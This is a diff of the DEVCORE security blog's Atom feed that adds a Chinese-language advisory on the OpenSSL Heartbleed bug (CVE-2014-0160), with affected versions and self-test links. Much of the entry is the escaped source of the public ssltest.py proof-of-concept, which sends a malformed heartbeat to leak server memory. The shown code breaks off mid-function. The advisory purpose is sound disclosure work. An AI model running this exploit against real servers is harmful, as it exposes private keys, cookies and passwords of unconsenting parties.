@@ -4,7 +4,7 @@
  <title>DEVCORE 戴夫寇爾</title>
  <link href="http://devco.re/" rel="self"/>
  <link href="http://devco.re"/>
- <updated>2014-04-08T18:12:34+08:00</updated>
+ <updated>2014-04-09T01:04:16+08:00</updated>
  <id>http://devco.re</id>
  <author>
    <name>DEVCORE</name>
@@ -194,6 +194,224 @@
 &lt;h3 id=&quot;&quot;&gt;結論&lt;/h3&gt;
 
 &lt;p&gt;使用 CSP 可以有效提升攻擊難度，讓許多常見的 XSS 攻擊失效，是一個非常推薦開發者使用的 HTTP header。但由於目前的開發者在 HTML 裡面寫 inline script 及 inline CSS 的比例非常高，同時也有一些網路服務預設都需要使用 inline script（例如 Google Analytics，相關解法可參考&lt;a href=&quot;http://stackoverflow.com/questions/3870345/new-google-analytics-code-into-external-file&quot;&gt;這裡&lt;/a&gt;），因此要享受這樣的安全之前，可能需要先付出許多時間與心力將網站大幅整理，套用 CSP 規範後網頁才能正常運作。&lt;/p&gt;</content>
+ </entry>
+ 
+ <entry>
+   <title>OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞 </title>
+   <link href="http://devco.re/blog/2014/04/08/openssl-heartbleed-CVE-2014-0160/"/>
+   <updated>2014-04-08T00:00:00+08:00</updated>
+   <id>http://devco.re/blog/2014/04/08/openssl-heartbleed-CVE-2014-0160</id>
+   <content type="html">&lt;h3 id=&quot;openssl_cve20140160_&quot;&gt;OpenSSL CVE-2014-0160 嚴重漏洞&lt;/h3&gt;
+
+&lt;p&gt;OpenSSL 今天公告了一個極度嚴重的漏洞（&lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160&quot;&gt;CVE-2014-0160&lt;/a&gt;），被稱為「&lt;a href=&quot;http://heartbleed.com/&quot;&gt;Heartbleed&lt;/a&gt;」，而他確實也如同心臟噴出血般嚴重。這個漏洞能讓攻擊者從伺服器記憶體中讀取 64 KB 的資料，利用傳送 heartbeat 的封包給伺服器，在封包中控制變數導致 memcpy 函數複製錯誤的記憶體資料，因而擷取記憶體中可能存在的機敏資料。記憶體中最嚴重可能包含 ssl private key、session cookie、使用者密碼等，因此可能因為這樣的漏洞導致伺服器遭到入侵或取得使用者帳號。&lt;/p&gt;
+
+&lt;p&gt;詳細的分析可以參閱 &lt;a href=&quot;http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html&quot;&gt;existential type crisis : Diagnosis of the OpenSSL Heartbleed Bug&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;軟體名稱：OpenSSL&lt;/li&gt;
+
+&lt;li&gt;影響範圍：1.0.1 至 1.0.1f / 1.0.2-beta&lt;/li&gt;
+
+&lt;li&gt;修復版本：1.0.1g / 1.0.2-beta1&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;OpenSSL 的公告如下：&lt;a href=&quot;https://www.openssl.org/news/secadv_20140407.txt&quot;&gt;https://www.openssl.org/news/secadv_20140407.txt&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;”’ A missing bounds check in the handling of the TLS heartbeat extension can be used to reveal up to 64k of memory to a connected client or server.&lt;/p&gt;
+
+&lt;p&gt;Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including 1.0.1f and 1.0.2-beta1. ”’&lt;/p&gt;
+
+&lt;h3 id=&quot;&quot;&gt;如何自我檢測？&lt;/h3&gt;
+
+&lt;p&gt;要如何測試自己的網站有沒有這樣的漏洞呢？可以利用以下的網站或工具直接查詢。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Heartbleed test &lt;a href=&quot;http://filippo.io/Heartbleed/&quot;&gt;http://filippo.io/Heartbleed/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;直接輸入 Domain 即可查詢，例如「fbi.gov」。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-eZWKW24FMRM/U0QjWVEvSlI/AAAAAAAAAQc/tG8bOO00NCg/s2560/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-eZWKW24FMRM/U0QjWVEvSlI/AAAAAAAAAQc/tG8bOO00NCg/w897-h678-no/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;自我測試工具 &lt;a href=&quot;http://s3.jspenguin.org/ssltest.py&quot;&gt;http://s3.jspenguin.org/ssltest.py&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;使用方法直接執行「python ssltest.py ifttt.com」，或是用「-p」指定特定 SSL 連接埠。畫面上會顯示出記憶體資料，可能內含機敏資料例如 private key、session cookie 等。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-jg8rcJJH8XQ/U0QjWVrjuBI/AAAAAAAAAQY/zMe-rUVImvI/s2560/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-jg8rcJJH8XQ/U0QjWVrjuBI/AAAAAAAAAQY/zMe-rUVImvI/w509-h677-no/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png&quot; alt=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; title=&quot;OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;原始碼如下：&lt;/p&gt;
+&lt;div class=&#39;highlight&#39;&gt;&lt;pre&gt;&lt;code class=&#39;python&#39;&gt;&lt;span class=&#39;c&#39;&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class=&#39;c&#39;&gt;# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)&lt;/span&gt;
+&lt;span class=&#39;c&#39;&gt;# The author disclaims copyright to this source code.&lt;/span&gt;
+
+&lt;span class=&#39;kn&#39;&gt;import&lt;/span&gt; &lt;span class=&#39;nn&#39;&gt;sys&lt;/span&gt;
+&lt;span class=&#39;kn&#39;&gt;import&lt;/span&gt; &lt;span class=&#39;nn&#39;&gt;struct&lt;/span&gt;
+&lt;span class=&#39;kn&#39;&gt;import&lt;/span&gt; &lt;span class=&#39;nn&#39;&gt;socket&lt;/span&gt;
+&lt;span class=&#39;kn&#39;&gt;import&lt;/span&gt; &lt;span class=&#39;nn&#39;&gt;time&lt;/span&gt;
+&lt;span class=&#39;kn&#39;&gt;import&lt;/span&gt; &lt;span class=&#39;nn&#39;&gt;select&lt;/span&gt;
+&lt;span class=&#39;kn&#39;&gt;import&lt;/span&gt; &lt;span class=&#39;nn&#39;&gt;re&lt;/span&gt;
+&lt;span class=&#39;kn&#39;&gt;from&lt;/span&gt; &lt;span class=&#39;nn&#39;&gt;optparse&lt;/span&gt; &lt;span class=&#39;kn&#39;&gt;import&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;OptionParser&lt;/span&gt;
+
+&lt;span class=&#39;n&#39;&gt;options&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;OptionParser&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;usage&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;=&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;%prog server [options]&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;description&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;=&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+&lt;span class=&#39;n&#39;&gt;options&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;add_option&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;-p&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;--port&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;type&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;=&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;int&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;default&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;=&lt;/span&gt;&lt;span class=&#39;mi&#39;&gt;443&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;help&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;=&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;TCP port to test (default: 443)&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+
+&lt;span class=&#39;k&#39;&gt;def&lt;/span&gt; &lt;span class=&#39;nf&#39;&gt;h2bin&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;x&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;):&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;x&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;replace&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;replace&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#39;se&#39;&gt;\n&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;decode&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+
+&lt;span class=&#39;n&#39;&gt;hello&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;h2bin&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;16 03 02 00  dc 01 00 00 d8 03 02 53&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;00 0f 00 01 01                                  &lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+
+&lt;span class=&#39;n&#39;&gt;hb&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;h2bin&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;&amp;#39;&amp;#39; &lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;18 03 02 00 03&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;01 40 00&lt;/span&gt;
+&lt;span class=&#39;s&#39;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+
+&lt;span class=&#39;k&#39;&gt;def&lt;/span&gt; &lt;span class=&#39;nf&#39;&gt;hexdump&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;):&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;for&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;b&lt;/span&gt; &lt;span class=&#39;ow&#39;&gt;in&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;xrange&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;mi&#39;&gt;0&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;len&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;),&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;16&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;):&lt;/span&gt;
+        &lt;span class=&#39;n&#39;&gt;lin&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;[&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;c&lt;/span&gt; &lt;span class=&#39;k&#39;&gt;for&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;c&lt;/span&gt; &lt;span class=&#39;ow&#39;&gt;in&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;[&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;b&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;:&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;b&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;+&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;16&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;]]&lt;/span&gt;
+        &lt;span class=&#39;n&#39;&gt;hxdat&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39; &amp;#39;&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;join&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#39;si&#39;&gt;%02X&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;%&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;ord&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;c&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt; &lt;span class=&#39;k&#39;&gt;for&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;c&lt;/span&gt; &lt;span class=&#39;ow&#39;&gt;in&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;lin&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+        &lt;span class=&#39;n&#39;&gt;pdat&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;join&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;((&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;c&lt;/span&gt; &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;32&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;ord&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;c&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;126&lt;/span&gt; &lt;span class=&#39;k&#39;&gt;else&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;.&amp;#39;&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;&lt;span class=&#39;k&#39;&gt;for&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;c&lt;/span&gt; &lt;span class=&#39;ow&#39;&gt;in&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;lin&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+        &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;  &lt;/span&gt;&lt;span class=&#39;si&#39;&gt;%04x&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;: &lt;/span&gt;&lt;span class=&#39;si&#39;&gt;%-48s&lt;/span&gt;&lt;span class=&#39;s&#39;&gt; &lt;/span&gt;&lt;span class=&#39;si&#39;&gt;%s&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;%&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;b&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;hxdat&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;pdat&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt;
+
+&lt;span class=&#39;k&#39;&gt;def&lt;/span&gt; &lt;span class=&#39;nf&#39;&gt;recvall&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;length&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;timeout&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;=&lt;/span&gt;&lt;span class=&#39;mi&#39;&gt;5&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;):&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;endtime&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;time&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;time&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;()&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;+&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;timeout&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;rdata&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;remain&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;length&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;while&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;remain&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;0&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+        &lt;span class=&#39;n&#39;&gt;rtime&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;endtime&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;-&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;time&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;time&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;()&lt;/span&gt; 
+        &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;rtime&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;0&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;
+        &lt;span class=&#39;n&#39;&gt;r&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;w&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;e&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;select&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;select&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;([&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;],&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;[],&lt;/span&gt; &lt;span class=&#39;p&#39;&gt;[],&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;5&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+        &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;s&lt;/span&gt; &lt;span class=&#39;ow&#39;&gt;in&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;r&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+            &lt;span class=&#39;n&#39;&gt;data&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;recv&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;remain&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+            &lt;span class=&#39;c&#39;&gt;# EOF?&lt;/span&gt;
+            &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;ow&#39;&gt;not&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;data&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+                &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;
+            &lt;span class=&#39;n&#39;&gt;rdata&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;+=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;data&lt;/span&gt;
+            &lt;span class=&#39;n&#39;&gt;remain&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;-=&lt;/span&gt; &lt;span class=&#39;nb&#39;&gt;len&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;data&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;rdata&lt;/span&gt;
+        
+
+&lt;span class=&#39;k&#39;&gt;def&lt;/span&gt; &lt;span class=&#39;nf&#39;&gt;recvmsg&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;):&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;hdr&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;recvall&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;s&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;mi&#39;&gt;5&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
+    &lt;span class=&#39;k&#39;&gt;if&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;hdr&lt;/span&gt; &lt;span class=&#39;ow&#39;&gt;is&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;:&lt;/span&gt;
+        &lt;span class=&#39;k&#39;&gt;print&lt;/span&gt; &lt;span class=&#39;s&#39;&gt;&amp;#39;Unexpected EOF receiving record header - server closed connection&amp;#39;&lt;/span&gt;
+        &lt;span class=&#39;k&#39;&gt;return&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;bp&#39;&gt;None&lt;/span&gt;
+    &lt;span class=&#39;n&#39;&gt;typ&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;ver&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;ln&lt;/span&gt; &lt;span class=&#39;o&#39;&gt;=&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;struct&lt;/span&gt;&lt;span class=&#39;o&#39;&gt;.&lt;/span&gt;&lt;span class=&#39;n&#39;&gt;unpack&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;(&lt;/span&gt;&lt;span class=&#39;s&#39;&gt;&amp;#39;&amp;gt;BHH&amp;#39;&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;,&lt;/span&gt; &lt;span class=&#39;n&#39;&gt;hdr&lt;/span&gt;&lt;span class=&#39;p&#39;&gt;)&lt;/span&gt;
